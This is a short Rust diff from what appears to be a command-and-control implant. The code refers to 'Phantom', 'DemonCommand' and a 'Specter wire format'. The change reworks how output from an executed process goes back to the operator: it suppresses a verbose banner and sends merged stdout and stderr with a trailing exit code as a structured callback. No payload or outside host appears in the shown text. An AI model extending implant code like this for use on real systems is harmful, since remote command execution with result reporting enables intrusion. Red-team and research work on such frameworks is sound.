@@ -74,10 +74,13 @@ pub(super) async fn execute_process(
                     .wait_with_output()
                     .await
                     .map_err(|error| PhantomError::Process(error.to_string()))?;
+                // Suppress verbose banner when piped — the banner would be
+                // persisted as a separate output entry that shadows the actual
+                // command stdout in CLI polling.
                 state.queue_callback(PendingCallback::Structured {
                     command_id: u32::from(DemonCommand::CommandProc),
                     request_id,
-                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
+                    payload: encode_proc_create(&binary, pid, true, true, false)?,
                 });
                 let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                 if !output.stderr.is_empty() {
@@ -86,7 +89,15 @@ pub(super) async fn execute_process(
                     }
                     merged.push_str(&String::from_utf8_lossy(&output.stderr));
                 }
-                state.queue_callback(PendingCallback::Output { request_id, text: merged });
+                // Include trailing exit code (i32 LE) matching Specter wire format.
+                let exit_code = output.status.code().unwrap_or(0);
+                let mut out_payload = encode_bytes(merged.as_bytes())?;
+                out_payload.extend_from_slice(&exit_code.to_le_bytes());
+                state.queue_callback(PendingCallback::Structured {
+                    command_id: u32::from(DemonCommand::CommandOutput),
+                    request_id,
+                    payload: out_payload,
+                });
             } else {
                 let child =
                     command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
